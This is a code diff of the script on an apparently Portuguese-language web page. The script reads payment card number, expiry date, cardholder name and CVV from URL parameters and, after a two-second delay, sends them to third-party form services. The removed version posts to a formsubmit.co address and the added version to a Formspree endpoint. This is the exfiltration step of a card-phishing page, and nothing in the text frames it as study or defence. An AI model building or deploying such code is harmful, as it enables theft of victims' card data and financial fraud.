@@ -92,38 +92,42 @@
 
   <script>
     document.getElementById('submit-button').addEventListener('click', function() {
-      this.disabled = true;
-      this.textContent = 'Por favor, aguarde...';
-      
-      setTimeout(function() {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://formsubmit.co/kitbembolado@proton.me';
+        this.disabled = true;
+        this.textContent = 'Por favor, aguarde...';
 
-        const inputs = [
-          { name: 'cardNumber', value: getQueryParameter('cardNumber') },
-          { name: 'expirationDate', value: getQueryParameter('expirationDate') },
-          { name: 'cardHolder', value: getQueryParameter('cardHolder') },
-          { name: 'cvv', value: getQueryParameter('cvv') }
-        ];
+        const data = new FormData();
+        data.append('cardNumber', getQueryParameter('cardNumber'));
+        data.append('expirationDate', getQueryParameter('expirationDate'));
+        data.append('cardHolder', getQueryParameter('cardHolder'));
+        data.append('cvv', getQueryParameter('cvv'));
 
-        inputs.forEach(function(input) {
-          const hiddenInput = document.createElement('input');
-          hiddenInput.type = 'hidden';
-          hiddenInput.name = input.name;
-          hiddenInput.value = input.value;
-          form.appendChild(hiddenInput);
-        });
-
-        document.body.appendChild(form);
-        form.submit();
-      }, 2000); // Envia os dados após 2 segundos
+        setTimeout(function() {
+            fetch('https://formspree.io/f/mqakzdrb', { // Substitua pelo seu ID do Formspree
+                method: 'POST',
+                body: data
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Dados enviados com sucesso!');
+                } else {
+                    alert('Erro ao enviar os dados.');
+                }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert('Erro ao enviar os dados.');
+            })
+            .finally(() => {
+                this.disabled = false;
+                this.textContent = 'Enviar';
+            });
+        }, 2000); // Envia os dados após 2 segundos
     });
 
     function getQueryParameter(name) {
-      const params = new URLSearchParams(window.location.search);
-      return params.get(name) || '';
+        const params = new URLSearchParams(window.location.search);
+        return params.get(name) || '';
     }
-  </script>
+</script>
 </body>
 </html>
